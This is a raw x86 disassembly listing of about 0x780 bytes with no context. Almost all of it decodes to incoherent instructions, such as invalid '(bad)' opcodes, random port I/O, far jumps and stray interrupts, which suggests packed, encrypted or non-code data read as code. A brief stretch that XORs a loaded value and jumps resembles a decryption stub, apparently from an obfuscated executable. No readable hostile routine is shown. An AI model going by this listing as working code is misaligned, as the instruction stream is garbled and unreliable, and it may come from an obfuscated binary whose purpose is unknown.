  40f2ed:	fcom   st(7)
  40f2ef:	aaa    
  40f2f0:	push   cs
  40f2f1:	add    eax,0xc7fda604
  40f2f6:	push   eax
  40f2f7:	jecxz  0x40f2c0
  40f2f9:	loope  0x40f2a9
  40f2fb:	test   DWORD PTR [ebx+0x71],edi
  40f2fe:	outs   dx,BYTE PTR ds:[esi]
  40f2ff:	jae    0x40f2be
  40f301:	sub    edi,DWORD PTR [edx+eax*8+0x5a]
  40f305:	jae    0x40f351
  40f307:	(bad)  
  40f308:	dec    edx
  40f309:	cmp    DWORD PTR [esi],esp
  40f30b:	les    esp,FWORD PTR [ecx]
  40f30d:	inc    esp
  40f30e:	mov    cl,0xc9
  40f310:	(bad)  
  40f311:	push   0x62
  40f313:	in     eax,0xb3
  40f315:	es push edi
  40f317:	pop    esp
  40f318:	ret    
  40f319:	call   0xb0182de7
  40f31e:	test   al,0x63
  40f320:	pop    eax
  40f321:	xor    ah,BYTE PTR [ebx+ebx*8+0x49]
  40f325:	loope  0x40f2d7
  40f327:	hlt    
  40f328:	and    eax,0x16e6ebd2
  40f32d:	mov    ch,0xa8
  40f32f:	leave  
  40f330:	push   ss
  40f331:	xchg   esp,eax
  40f332:	dec    edx
  40f333:	(bad)  [eax-0x321561b5]
  40f339:	sbb    DWORD PTR [esi-0x5a],ebp
  40f33c:	lahf   
  40f33d:	jmp    0xbe99:0x24f295c2
  40f344:	shr    bl,cl
  40f346:	xor    DWORD PTR [ecx+ebx*2-0x17],edx
  40f34a:	inc    ebx
  40f34b:	sahf   
  40f34c:	mov    al,BYTE PTR [ecx+0x1eac30ef]
  40f352:	push   es
  40f353:	push   esp
  40f354:	outs   dx,DWORD PTR ds:[esi]
  40f355:	out    dx,eax
  40f356:	shl    DWORD PTR [edx+0xc],0xff
  40f35a:	add    bl,BYTE PTR [eax]
  40f35c:	sbb    BYTE PTR [edi+0x5b4fe29b],dh
  40f362:	mov    eax,0xa7c746d1
  40f367:	(bad)
  40f36c:	jmp    0x287cb318
  40f371:	rep outs dx,BYTE PTR ds:[esi]
  40f373:	in     ax,0x60
  40f376:	fadd   DWORD PTR [ecx+0xa0a5afd]
  40f37c:	in     eax,dx
  40f37d:	mov    ecx,0x477fb1eb
  40f382:	dec    ecx
  40f383:	scas   eax,DWORD PTR es:[edi]
  40f384:	outs   dx,DWORD PTR ds:[esi]
  40f385:	enter  0xf265,0x57
  40f389:	mov    eax,0xa30651d3
  40f38e:	int    0xaa
  40f390:	cmp    BYTE PTR [ecx+0x70a8917c],dl
  40f396:	jl     0x40f34d
  40f398:	iret   
  40f399:	dec    ebx
  40f39a:	add    al,0xb8
  40f39c:	jno    0x40f34d
  40f39e:	repz inc ebx
  40f3a0:	sbb    DWORD PTR [ecx-0x1e],esp
  40f3a3:	pop    edx
  40f3a4:	xchg   edi,eax
  40f3a5:	mov    BYTE PTR [ebp+ebp*8-0x42],bl
  40f3a9:	ret    
  40f3aa:	xor    DWORD PTR [ecx],eax
  40f3ac:	mov    ebx,0xed6f41ff
  40f3b1:	out    dx,eax
  40f3b2:	(bad)  
  40f3b4:	xchg   esi,eax
  40f3b5:	dec    eax
  40f3b6:	fistp  QWORD PTR [ecx-0x66]
  40f3b9:	aaa    
  40f3ba:	sub    ebx,DWORD PTR [ebx+0x7a7c444a]
  40f3c0:	mul    BYTE PTR [edi+0x69]
  40f3c3:	lock cmp dh,BYTE PTR [eax+0x460498ca]
  40f3ca:	inc    ebx
  40f3cb:	retf   
  40f3cc:	test   eax,0xd82c6a45
  40f3d1:	jl     0x40f3c2
  40f3d3:	enter  0x2a84,0x45
  40f3d7:	add    BYTE PTR [ecx+edx*4],bl
  40f3da:	pusha  
  40f3db:	push   esp
  40f3dc:	aad    0xc6
  40f3de:	push   0xfe698a5a
  40f3e3:	imul   edx,DWORD PTR [ecx],0x9c9ad365
  40f3e9:	xchg   BYTE PTR [edi+0x56],al
  40f3ec:	retf   
  40f3ed:	xchg   ch,dh
  40f3ef:	ror    edi,1
  40f3f1:	enter  0x253f,0x78
  40f3f5:	fs and al,0x1a
  40f3f8:	sti    
  40f3f9:	inc    edx
  40f3fa:	cdq    
  40f3fb:	inc    ecx
  40f3fc:	pop    ecx
  40f3fd:	pop    ds
  40f3fe:	adc    al,BYTE PTR [ebp+0x6c]
  40f401:	std    
  40f402:	stc    
  40f403:	inc    ebx
  40f404:	inc    edx
  40f405:	sbb    eax,edx
  40f407:	(bad)
  40f40a:	and    edi,eax
  40f40c:	mov    BYTE PTR [ecx-0x1a836733],dl
  40f412:	push   0x71fa8d59
  40f417:	out    0xb,al
  40f419:	out    0x84,eax
  40f41b:	mov    al,ds:0x712be5a4
  40f420:	shl    BYTE PTR [edx+esi*8+0x4462a97d],1
  40f427:	push   ds
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	add    al,cl
  40f42b:	shl    DWORD PTR [edx+0x27a430cb],cl
  40f431:	arpl   WORD PTR [edx],si
  40f433:	gs xor bl,ch
  40f436:	push   es
  40f437:	mov    eax,0xfe59aa4e
  40f43c:	pop    esp
  40f43d:	or     esi,ebp
  40f43f:	jl     0x40f428
  40f441:	lds    ecx,FWORD PTR [eax]
  40f443:	sbb    DWORD PTR [esi-0x2a],eax
  40f446:	mov    WORD PTR [ebx],ss
  40f448:	mov    al,0x83
  40f44a:	jno    0x40f3e3
  40f44c:	outs   dx,DWORD PTR ds:[esi]
  40f44d:	pop    ebx
  40f44e:	outs   dx,DWORD PTR ds:[esi]
  40f44f:	jbe    0x40f4d0
  40f451:	popf   
  40f452:	xchg   esp,eax
  40f453:	inc    ebx
  40f454:	sti    
  40f455:	adc    edi,0xffffffdd
  40f458:	ins    BYTE PTR es:[edi],dx
  40f459:	cld    
  40f45a:	cwde   
  40f45b:	mov    ecx,0xc76c0642
  40f460:	sub    cl,bl
  40f462:	jmp    0xf276:0x872cbab6
  40f469:	cmc    
  40f46a:	adc    al,0xc8
  40f46c:	jmp    0x40f426
  40f46e:	not    DWORD PTR [ebp-0x62]
  40f471:	xchg   esp,eax
  40f472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f473:	in     al,0x11
  40f475:	mov    esp,0x86c7f865
  40f47a:	cmp    DWORD PTR [esi-0x774dda11],esi
  40f480:	adc    bl,BYTE PTR [esi+0x66]
  40f483:	mov    al,0x6f
  40f485:	adc    ecx,ecx
  40f487:	repnz sbb al,bh
  40f48a:	call   0x5478:0x691294e0
  40f491:	(bad)  
  40f492:	cmp    al,0x64
  40f494:	mov    edx,DWORD PTR [edx]
  40f496:	mov    esi,DWORD PTR ds:0x421ce2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421ce2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	jb     0x40f45e
  40f4c6:	jmp    0x40f4e0
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x6a]
  40f4d1:	jae    0x40f487
  40f4d3:	cmp    dl,BYTE PTR [esi-0x1b81542]
  40f4d9:	fadd   st,st(5)
  40f4db:	mov    bh,0x41
  40f4dd:	mov    edx,DWORD PTR [ebp-0x46]
  40f4e0:	pop    ds
  40f4e1:	xchg   ecx,eax
  40f4e2:	ret    
  40f4e3:	sar    DWORD PTR [edx-0xa],cl
  40f4e6:	dec    edx
  40f4e7:	mov    edx,DWORD PTR [edi-0x24]
  40f4ea:	sbb    eax,0xe76b4cf
  40f4ef:	(bad)  
  40f4f0:	mov    edx,0x6185264d
  40f4f5:	loope  0x40f4e9
  40f4f7:	fwait
  40f4f8:	add    esi,edi
  40f4fa:	mov    ebx,0x6af0d386
  40f4ff:	jle    0x40f541
  40f501:	xchg   bp,ax
  40f503:	jge    0x40f556
  40f505:	mov    eax,ds:0xf037bf1c
  40f50a:	ins    BYTE PTR es:[edi],dx
  40f50b:	and    DWORD PTR [esi],ebx
  40f50d:	sbb    al,0x92
  40f50f:	in     eax,0xb8
  40f511:	and    al,0x73
  40f513:	push   edx
  40f514:	jl     0x40f545
  40f516:	aaa    
  40f517:	(bad)  
  40f519:	mov    bl,0x4a
  40f51b:	pop    esi
  40f51c:	in     al,dx
  40f51d:	or     BYTE PTR [edx+0x1a626745],al
  40f523:	dec    ecx
  40f524:	pop    edx
  40f525:	add    eax,ecx
  40f527:	fwait
  40f528:	nop
  40f529:	lods   eax,DWORD PTR ds:[esi]
  40f52a:	mov    WORD PTR [edi+ecx*4],ss
  40f52d:	or     eax,0xa4560682
  40f532:	fst    DWORD PTR [eax-0x6d]
  40f535:	sbb    BYTE PTR [edx+eiz*1+0x76109ff0],ch
  40f53c:	mov    ss,WORD PTR [ecx]
  40f53e:	cmp    edx,eax
  40f540:	dec    edx
  40f541:	jmp    0x40f549
  40f543:	mov    ecx,0x8c2ada2c
  40f548:	adc    al,0x1
  40f54a:	pop    es
  40f54b:	add    DWORD PTR [ecx-0x415053c7],ebp
  40f551:	icebp  
  40f552:	push   eax
  40f553:	pusha  
  40f554:	fnstcw WORD PTR [eax-0x56]
  40f557:	psubusb mm4,QWORD PTR [ebp+0x1a9ff90a]
  40f55e:	repz or DWORD PTR [esi-0xe],0xfffffff1
  40f563:	or     dl,BYTE PTR [edi+ecx*8+0x665ad0c1]
  40f56a:	adc    bh,dh
  40f56c:	inc    edi
  40f56d:	out    0xda,al
  40f56f:	ins    BYTE PTR es:[edi],dx
  40f570:	cmp    ecx,DWORD PTR [esi-0x2a]
  40f573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f574:	mov    ebx,0x75ac3dfd
  40f579:	ror    ebp,cl
  40f57b:	push   ss
  40f57c:	mov    eax,0xd3f3d859
  40f581:	test   eax,0xaf6e2e9b
  40f586:	mov    ah,0x4f
  40f588:	lods   eax,DWORD PTR ds:[esi]
  40f589:	sbb    eax,DWORD PTR [esi-0x10]
  40f58c:	fsub   st,st(7)
  40f58e:	or     DWORD PTR [eax-0x59],edx
  40f591:	xchg   BYTE PTR [ebp+0x7c85a5f],al
  40f597:	inc    esp
  40f598:	mov    esi,0xaac3a56f
  40f59d:	xchg   BYTE PTR [esp+eiz*4-0x1183dd13],bh
  40f5a4:	cdq    
  40f5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5a6:	lea    edi,[edx]
  40f5a8:	cmp    ah,BYTE PTR [eax-0x37]
  40f5ab:	mov    ds:0x94f58635,al
  40f5b0:	shr    ebp,cl
  40f5b2:	cmp    BYTE PTR [edx-0x6bd01d1],bl
  40f5b8:	sbb    DWORD PTR [ebx+0x42],0x2
  40f5bc:	sub    BYTE PTR [esi+eiz*8-0x53],dl
  40f5c0:	push   cs
  40f5c1:	outs   dx,DWORD PTR ds:[esi]
  40f5c2:	out    0x56,al
  40f5c4:	xchg   DWORD PTR [ecx-0x1b],eax
  40f5c7:	out    0x43,eax
  40f5c9:	sbb    BYTE PTR [edi],al
  40f5cb:	push   ss
  40f5cc:	add    cl,BYTE PTR [ebp-0x67a8a9c0]
  40f5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5d3:	rol    DWORD PTR [ebx+0x3150a1bb],cl
  40f5d9:	nop
  40f5da:	sub    cl,dl
  40f5dc:	mov    ebx,0x30bbb05
  40f5e1:	xchg   ebp,eax
  40f5e2:	jecxz  0x40f662
  40f5e4:	push   cs
  40f5e5:	imul   esi,DWORD PTR [edi+0x298886ea],0xffffffcc
  40f5ec:	dec    ebx
  40f5ed:	cmp    BYTE PTR [eax-0x73a41923],ah
  40f5f3:	fs adc eax,0xf830d141
  40f5f9:	mov    ds:0x3cc6c078,eax
  40f5fe:	push   ebp
  40f5ff:	cmp    edx,edx
  40f601:	int    0x51
  40f603:	pusha  
  40f604:	out    dx,al
  40f605:	(bad)  
  40f606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f607:	das    
  40f608:	addr16 pop edx
  40f60a:	bound  ebx,QWORD PTR [edx-0x4fd964a1]
  40f610:	jge    0x40f639
  40f612:	jo     0x40f5a5
  40f614:	into   
  40f615:	add    cl,BYTE PTR [edx-0x24ef73a7]
  40f61b:	ret    
  40f61c:	lock out 0x1b,eax
  40f61f:	icebp  
  40f620:	shr    DWORD PTR [eax-0x12bc7373],cl
  40f626:	enter  0xbeba,0x89
  40f62a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f62b:	add    BYTE PTR [esi-0x7a],ah
  40f62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f62f:	jmp    0xc9d0:0x134bfe94
  40f636:	js     0x40f678
  40f638:	push   esp
  40f639:	out    dx,al
  40f63a:	not    DWORD PTR [edx]
  40f63c:	clc    
  40f63d:	push   0xbd947b85
  40f642:	loop   0x40f61c
  40f644:	mov    al,0x47
  40f646:	inc    ebx
  40f647:	xor    ch,BYTE PTR [esi-0x5605dfab]
  40f64d:	mov    DWORD PTR [ebx-0x4d44ce02],ebx
  40f653:	mov    WORD PTR [ebx-0x1e6fdad9],gs
  40f659:	pop    edx
  40f65a:	xor    ebp,esp
  40f65c:	mov    al,0x3b
  40f65e:	dec    esi
  40f65f:	lea    ebp,[esi-0x30a7c62]
  40f665:	inc    edi
  40f666:	fldcw  WORD PTR [edx+0x716c0475]
  40f66c:	(bad)  
  40f66d:	sub    DWORD PTR [esi-0x4e],esi
  40f670:	pop    ebx
  40f671:	neg    DWORD PTR [ebp-0x2b008b87]
  40f677:	mov    esp,0x25a2847e
  40f67c:	add    BYTE PTR [ebx+ebx*1-0x42],cl
  40f680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f681:	popa   
  40f682:	scas   eax,DWORD PTR es:[edi]
  40f683:	jne    0x40f66b
  40f685:	mov    ebx,0x64cf29e0
  40f68a:	sub    eax,0x87982435
  40f68f:	or     al,0x60
  40f691:	xchg   BYTE PTR [edx-0x3f4c9c40],ah
  40f697:	dec    ecx
  40f698:	out    0x45,al
  40f69a:	shl    DWORD PTR [edi+0x20],0x9f
  40f69e:	adc    DWORD PTR [ebp-0x65],0xbc00e9fb
  40f6a5:	scas   eax,DWORD PTR es:[edi]
  40f6a6:	pop    edx
  40f6a7:	sub    DWORD PTR [ecx+0x65d69eb2],eax
  40f6ad:	loopne 0x40f6e4
  40f6af:	cmp    esi,DWORD PTR [eax+0x7fc1a213]
  40f6b5:	push   cs
  40f6b6:	jle    0x40f72a
  40f6b8:	jno    0x40f6a7
  40f6ba:	cmp    DWORD PTR [ebx-0x4d],edx
  40f6bd:	mov    ds:0xaf54f88f,eax
  40f6c2:	push   esp
  40f6c3:	scas   al,BYTE PTR es:[edi]
  40f6c4:	jg     0x40f6db
  40f6c6:	lods   al,BYTE PTR ds:[esi]
  40f6c7:	xchg   edx,eax
  40f6c8:	rol    BYTE PTR [edx+0x7a],0x9a
  40f6cc:	xor    eax,0xe34a6f9a
  40f6d1:	mov    edx,0x4c8215e0
  40f6d6:	dec    esi
  40f6d7:	lods   eax,DWORD PTR ds:[esi]
  40f6d8:	loope  0x40f72b
  40f6da:	and    ebp,DWORD PTR ds:0x24ec845e
  40f6e0:	bound  ecx,QWORD PTR [esi-0x23]
  40f6e3:	mov    ebp,0x849e4744
  40f6e8:	inc    edi
  40f6e9:	sub    cl,BYTE PTR [edx+edi*1-0x362fa98]
  40f6f0:	icebp  
  40f6f1:	or     bh,BYTE PTR [eax+ebp*8-0x7e716b38]
  40f6f8:	and    ch,BYTE PTR [ecx+0x2a1fdbad]
  40f6fe:	cwde   
  40f6ff:	loop   0x40f770
  40f701:	mov    ds:0x22c23e69,eax
  40f706:	cmp    al,0x44
  40f708:	pop    esi
  40f709:	push   eax
  40f70a:	lock push es
  40f70c:	inc    ebp
  40f70d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f70e:	adc    bh,bh
  40f710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f711:	out    0x2e,al
  40f713:	fs call 0x8d3b9fb8
  40f719:	mov    edi,0x6cc3f51a
  40f71e:	fbld   TBYTE PTR [edi-0x2c]
  40f721:	and    al,0x2
  40f723:	sub    BYTE PTR [edi-0x5a],bl
  40f726:	cdq    
  40f727:	cmovb  edx,DWORD PTR [eax-0x62]
  40f72b:	aad    0xa3
  40f72d:	gs xchg esi,eax
  40f72f:	in     al,dx
  40f730:	loope  0x40f6d4
  40f732:	sti    
  40f733:	(bad)  
  40f734:	mov    al,0xc9
  40f736:	sub    bl,BYTE PTR [eax+esi*8+0x651d4472]
  40f73d:	data16 cld 
  40f73f:	jmp    0x40f79b
  40f741:	lahf   
  40f742:	pusha  
  40f743:	loop   0x40f6cc
  40f745:	mov    ecx,0x67749be0
  40f74a:	sub    edi,DWORD PTR [edx]
  40f74c:	jb     0x40f763
  40f74e:	into   
  40f74f:	fistp  WORD PTR [ebx+0x5d7a9b5b]
  40f755:	daa    
  40f756:	pusha  
  40f757:	cmp    ebp,DWORD PTR [edx-0x321bc3dd]
  40f75d:	imul   edx,DWORD PTR [ebp+0x679c0bf2],0x210633f9
  40f767:	dec    bp
  40f769:	mov    dl,0x90
  40f76b:	fimul  DWORD PTR [edx-0x6ec8c337]
  40f771:	ins    BYTE PTR es:[edi],dx
  40f772:	retf   0xd1fb
  40f775:	repnz test BYTE PTR [ecx+0x4ec548c8],ah
  40f77c:	sub    eax,0x29009caf
  40f781:	mov    bl,0xdd
  40f784:	mov    ds:0x134b84c,al
  40f789:	adc    ebp,DWORD PTR [edi]
  40f78b:	cld    
  40f78c:	mov    edi,0xa8f124e6
  40f791:	sub    ah,al
  40f793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f794:	call   0x6dc40c99
  40f799:	retf   
  40f79a:	mov    DWORD PTR [edx+0x49],esp
  40f79d:	inc    edi
  40f79e:	fldcw  WORD PTR [edi-0x4f]
  40f7a1:	mov    dl,0x69
  40f7a3:	and    al,0x46
  40f7a5:	push   ecx
  40f7a6:	ds lods eax,DWORD PTR gs:[esi]
  40f7a9:	pop    esp
  40f7aa:	std    
  40f7ab:	push   eax
  40f7ac:	js     0x40f760
  40f7ae:	jnp    0x40f801
  40f7b0:	outs   dx,DWORD PTR ds:[esi]
  40f7b1:	ret    0x827c
  40f7b4:	adc    DWORD PTR [ebx-0x3a],ecx
  40f7b7:	jns    0x40f747
  40f7b9:	cmp    BYTE PTR [eax+ecx*1],dl
  40f7bc:	outs   dx,DWORD PTR ds:[esi]
  40f7be:	jne    0x40f74f
  40f7c0:	push   es
  40f7c1:	pop    ebp
  40f7c2:	loope  0x40f828
  40f7c4:	inc    edx
  40f7c5:	mov    esi,0x2dc250dc
  40f7ca:	scas   al,BYTE PTR es:[edi]
  40f7cb:	sbb    eax,0x7eec9c8a
  40f7d0:	cmp    BYTE PTR [eax],al
  40f7d2:	test   DWORD PTR [ebp-0x76489c88],ebx
  40f7d8:	inc    BYTE PTR [ecx+0x4e2bc3ef]
  40f7de:	lds    ebp,FWORD PTR [eax-0x5]
  40f7e1:	in     al,0x47
  40f7e3:	push   ebp
  40f7e4:	loope  0x40f7f6
  40f7e6:	rcr    BYTE PTR [ecx-0x1e],0x6
  40f7ea:	mov    esp,0xee35d0f1
  40f7ef:	push   ss
  40f7f0:	int3   
  40f7f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f2:	mov    dl,0x4a
  40f7f4:	jne    0x40f7d7
  40f7f6:	ret    
  40f7f7:	xor    bl,al
  40f7f9:	xor    cl,BYTE PTR [ebx]
  40f7fb:	inc    ebx
  40f7fc:	test   eax,0x4b6ab012
  40f801:	idiv   DWORD PTR [edi+0x5b]
  40f804:	sahf   
  40f805:	xchg   BYTE PTR [edi],al
  40f807:	sbb    ch,BYTE PTR [ebp+0x59]
  40f80a:	and    edi,DWORD PTR ds:0xf29e6878
  40f810:	mov    ah,0xd5
  40f812:	ins    DWORD PTR es:[edi],dx
  40f813:	ss adc eax,0x4c782616
  40f819:	int3   
  40f81a:	xor    eax,0x48bf19ae
  40f81f:	clc    
  40f820:	add    ah,bh
  40f822:	js     0x40f7ed
  40f824:	inc    eax
  40f825:	mov    esp,0x85e3edc
  40f82b:	aam    0x57
  40f82d:	test   DWORD PTR [ebx+0x362d3d16],ecx
  40f833:	xchg   DWORD PTR [edi],edx
  40f835:	(bad)  
  40f836:	iret   
  40f837:	ds ins BYTE PTR es:[edi],dx
  40f839:	mov    bh,0xa3
  40f83b:	ja     0x40f87a
  40f83d:	stc    
  40f83e:	add    al,0xce
  40f840:	sbb    al,0xde
  40f842:	add    dl,ah
  40f844:	xor    BYTE PTR [edi+0x521975ea],0x8c
  40f84b:	pop    esp
  40f84c:	xchg   BYTE PTR ds:0x6f90b6d2,ah
  40f852:	fadd   DWORD PTR [eax+0x6c]
  40f855:	iret   
  40f856:	mov    eax,ds:0xf83c7290
  40f85b:	ja     0x40f8a0
  40f85d:	dec    ecx
  40f85e:	jo     0x40f847
  40f860:	es dec edi
  40f862:	nop
  40f863:	(bad)  
  40f864:	sbb    ebp,edi
  40f866:	pop    esp
  40f867:	pushf  
  40f868:	(bad)  
  40f86a:	inc    ebx
  40f86b:	mov    eax,edi
  40f86d:	cmp    al,0xab
  40f86f:	dec    ebp
  40f870:	pushf  
  40f871:	jge    0x40f7fc
  40f873:	into   
  40f874:	add    BYTE PTR [eax+0x66a8c36f],bl
  40f87a:	cwde   
  40f87b:	in     al,dx
  40f87c:	loopne 0x40f8be
  40f87e:	mov    dl,0xeb
  40f880:	jmp    FWORD PTR [esi]
  40f882:	dec    esp
  40f883:	mov    bl,0x84
  40f885:	test   eax,0x25b8e87d
  40f88a:	fs (bad) 
  40f88c:	jb     0x40f899
  40f88e:	xor    dh,BYTE PTR [ebx]
  40f890:	fistp  DWORD PTR [edx-0x36]
  40f893:	int    0x7e
  40f895:	sti    
  40f896:	sbb    edi,DWORD PTR [esi+0x8]
  40f899:	cmp    dh,BYTE PTR [esi]
  40f89b:	sbb    al,0xd6
  40f89d:	pop    edx
  40f89e:	or     al,0x23
  40f8a0:	jo     0x40f86c
  40f8a2:	mov    edi,0xaca6a602
  40f8a7:	inc    esi
  40f8a8:	les    edx,FWORD PTR [ebp-0x6e997412]
  40f8ae:	xor    bl,BYTE PTR [ecx+0x5979192c]
  40f8b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b5:	mov    dl,ah
  40f8b7:	nop
  40f8b8:	mov    esi,0x2292168b
  40f8bd:	xchg   edx,eax
  40f8be:	inc    esi
  40f8bf:	jl     0x40f886
  40f8c1:	(bad)  
  40f8c3:	dec    ebx
  40f8c4:	shl    BYTE PTR [ecx+0x7757df6c],cl
  40f8ca:	push   ds
  40f8cb:	test   BYTE PTR [ebx-0x519303c6],ch
  40f8d1:	cmp    BYTE PTR [eax-0x4b],dh
  40f8d4:	xlat   BYTE PTR ds:[ebx]
  40f8d5:	enter  0x26b7,0xc1
  40f8d9:	fbstp  TBYTE PTR [edx-0x1b]
  40f8dc:	cmp    eax,0x7b96d166
  40f8e1:	or     BYTE PTR [ecx],al
  40f8e3:	pop    eax
  40f8e4:	in     eax,dx
  40f8e5:	pop    esi
  40f8e6:	xor    al,0xd6
  40f8e8:	retf   0x9cd9
  40f8eb:	ss pop ecx
  40f8ed:	idiv   BYTE PTR [ebp-0x77238991]
  40f8f3:	mov    bl,0xe2
  40f8f5:	in     eax,0xb1
  40f8f7:	pushf  
  40f8f8:	(bad)  
  40f8f9:	icebp  
  40f8fa:	add    ecx,DWORD PTR [ebx-0x2c47674e]
  40f900:	mov    ebx,edi
  40f902:	sbb    al,0x62
  40f904:	add    ch,BYTE PTR [ebp-0x6cb907c3]
  40f90a:	mov    esp,0x81d188fd
  40f90f:	cmp    eax,0x9a5b9839
  40f914:	(bad)  
  40f915:	push   edi
  40f917:	inc    eax
  40f918:	adc    eax,0x88984ee0
  40f91d:	or     eax,0x5fcbc2bf
  40f922:	sbb    ebx,DWORD PTR [ecx+ebp*1]
  40f925:	cmp    DWORD PTR [ecx+ebp*1],esi
  40f928:	cmp    edx,edi
  40f92a:	ins    DWORD PTR es:[edi],dx
  40f92b:	js     0x40f983
  40f92d:	lea    edi,[edi]
  40f92f:	pop    ds
  40f930:	inc    ecx
  40f931:	push   ebp
  40f932:	mov    bh,0x18
  40f934:	(bad)  
  40f935:	pop    edx
  40f936:	clc    
  40f937:	mov    ebx,0x2b7975c7
  40f93c:	inc    eax
  40f93d:	(bad)  
  40f93e:	jns    0x40f8f1
  40f940:	daa    
  40f941:	mov    DWORD PTR [ebx+esi*4+0x47011293],ebx
  40f948:	xor    dl,BYTE PTR [ebp+0x3527cdb5]
  40f94e:	jmp    0x40f944
  40f950:	aam    0xd2
  40f952:	pop    ecx
  40f953:	xor    al,0x16
  40f955:	inc    ecx
  40f956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f957:	mov    DWORD PTR [eax+0x12],ebp
  40f95a:	add    DWORD PTR [edx-0x68],esp
  40f95d:	ror    BYTE PTR [edi+0x5b],1
  40f960:	xor    DWORD PTR [edx+0x41555131],ecx
  40f966:	sti    
  40f967:	stos   DWORD PTR es:[edi],eax
  40f968:	sbb    bl,BYTE PTR [ecx+0x11]
  40f96b:	in     eax,dx
  40f96c:	pop    es
  40f96d:	lds    edx,FWORD PTR [ecx]
  40f96f:	pushf  
  40f970:	xchg   edi,eax
  40f971:	pushw  0x66
  40f974:	mov    esi,0x263ae329
  40f979:	popf   
  40f97a:	xchg   DWORD PTR [eax],edx
  40f97c:	jns    0x40f9ba
  40f97e:	jns    0x40f970
  40f980:	test   BYTE PTR [edx+0x18],dl
  40f983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f984:	repz add eax,0xae94ea10
  40f98a:	push   edx
  40f98b:	and    al,0xfd
  40f98d:	xchg   edx,eax
  40f98e:	in     eax,0x7a
  40f990:	lock xchg BYTE PTR [ecx+edi*1+0x4f],bl
  40f995:	dec    edi
  40f996:	add    edx,DWORD PTR [esi+eax*2-0x19c7e9e2]
  40f99d:	iret   
  40f99e:	and    al,0xb5
  40f9a0:	mov    edi,0xdb1bd645
  40f9a5:	shl    BYTE PTR [edi+ebx*8+0x77],0xb9
  40f9aa:	loop   0x40f93e
  40f9ac:	jecxz  0x40f9d4
  40f9ae:	shl    ecx,1
  40f9b0:	xor    al,0xd9
  40f9b2:	lea    edx,[ecx+0x3ee65eef]
  40f9b8:	(bad)  
  40f9b9:	mov    ebx,0xf1e96eee
  40f9be:	ja     0x40f9a5
  40f9c0:	adc    DWORD PTR [edx+0x268a9d74],ebx
  40f9c6:	and    al,BYTE PTR [ecx-0xb]
  40f9c9:	jno    0x40f980
  40f9cb:	pop    ss
  40f9cc:	cmp    ebx,eax
  40f9ce:	jb     0x40fa15
  40f9d0:	or     esi,esp
  40f9d2:	mov    esp,DWORD PTR [eax-0x77e56b6c]
  40f9d8:	mov    esp,0x72647c65
  40f9dd:	mov    eax,0xe01d5a44
  40f9e2:	jno    0x40f9d0
  40f9e4:	(bad)  
  40f9e6:	in     eax,dx
  40f9e7:	dec    edi
  40f9e8:	lods   eax,DWORD PTR ds:[esi]
  40f9e9:	mov    ebp,0xc0364a4
  40f9ee:	inc    ebp
  40f9ef:	mov    eax,ds:0x27780d66
  40f9f4:	and    DWORD PTR [edx-0x43],edi
  40f9f7:	ret    0x5bba
  40f9fa:	and    al,0x78
  40f9fc:	out    dx,eax
  40f9fd:	sub    DWORD PTR [ebx+edx*8],edi
  40fa00:	xor    eax,0x145d529f
  40fa05:	out    dx,al
  40fa06:	mov    al,ds:0xe0a61228
  40fa0b:	mov    bl,0x12
  40fa0d:	push   cs
  40fa0e:	jle    0x40fa6c
  40fa10:	push   esi
  40fa11:	test   eax,0x1685e999
  40fa16:	jg     0x40f9bd
  40fa18:	mov    al,ds:0x6041881b
  40fa1d:	fwait
  40fa1e:	jle    0x40fa68
  40fa20:	aaa    
  40fa21:	repnz dec ebp
  40fa23:	scas   al,BYTE PTR es:[edi]
  40fa24:	jo     0x40fa4d
  40fa26:	jo     0x40fa80
  40fa28:	mov    al,ds:0xe10e5204
  40fa2d:	repnz fwait
  40fa2f:	adc    al,0x60
  40fa31:	dec    esi
  40fa32:	lods   eax,DWORD PTR ds:[esi]
  40fa33:	and    dl,BYTE PTR [eax+0x20]
  40fa36:	repnz sub DWORD PTR [ebp-0x46],edx
  40fa3a:	test   DWORD PTR [esi-0x164e040],0xcd777d40
  40fa44:	or     al,0x3e
  40fa46:	and    DWORD PTR [edx-0x22db04d1],edi
  40fa4c:	pop    edi
  40fa4d:	xchg   ebx,eax
  40fa4e:	inc    esi
  40fa4f:	stc    
  40fa50:	daa    
  40fa51:	push   0x75251e86
  40fa56:	fyl2x  
  40fa58:	mov    bh,0x9f
  40fa5a:	outs   dx,BYTE PTR ds:[esi]
  40fa5b:	pushf  
  40fa5c:	dec    esp
  40fa5d:	inc    ecx
  40fa5e:	add    bl,bl
  40fa60:	mov    eax,0x5ee8a10e
  40fa65:	push   ebx
  40fa66:	adc    DWORD PTR [ebp-0x15ed3d67],esi
  40fa6c:	in     eax,dx
  40fa6d:	inc    ebp
